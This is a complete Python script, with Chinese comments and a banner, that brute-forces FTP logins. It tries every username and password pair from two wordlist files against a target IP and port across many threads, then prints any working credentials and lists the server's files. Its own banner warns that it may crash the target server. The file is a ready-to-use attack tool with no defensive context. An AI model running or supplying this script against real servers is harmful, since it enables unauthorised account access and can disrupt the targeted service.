import ftplib
import  sys
import threading
import queue



# 多线程
def Thread(ip,port,quantity):
    Thread=queue.Queue()
    for username in open('user.txt'):
        for password in open('passwd.txt'):
            username = username.replace('\n', '')
            password = password.replace('\n', '')
            diclist=username+'|'+password
            Thread.put(diclist)
    for i in  range(int(quantity)):# 定义线程数
        Threads=threading.Thread(target=Log_in,args=(Thread,ip,port,))
        Threads.start()




# 破解
def Log_in(Thread,ip,port):
    while not Thread.empty():
        user_passwd=Thread.get()
        user_passwd=user_passwd.split('|')

        try:
            try:
                ftp=ftplib.FTP() #
                ftp.connect(str(ip),int(port))# 连接的目标ip和端口

                ftp.login(user_passwd[0],user_passwd[1]) # 输入密码

                print("破解成功正确：用户是"+user_passwd[0]+"密码是："+user_passwd[1])
                print(ftp.retrlines('list'))
                ftp.close()


            except ConnectionRefusedError:
                print("连接被拒绝\n*可能对方没有开启FTP服务\n*或者你的地址和端口错误")
                break
        except ftplib.error_perm:
            ftp.close()
            print("密码错误==用户：" + user_passwd[0] + "   密码：" + user_passwd[1])



def enter():
    print("""
         _____ _____ ____  
        |  ___|_   _|  _ \ 
        | |_    | | | |_) |
        |  _|   | | |  __/ 
        |_|     |_| |_|    
                                FTP服务器的爆破
    注意：发生请求过多可能会对目标服务器扫挂，尽量不要太多线程
    语法：python 文件名.py [ip] [端口] [线程数量]
    """)


if __name__ == '__main__':
    enter()
    ip=sys.argv[1]
    port=sys.argv[2]
    quantity=sys.argv[3]
    print("线程数是"+str(quantity))
    print("你输入的地址是"+ip+ "端口是" + port)
    Thread(ip,port,quantity)
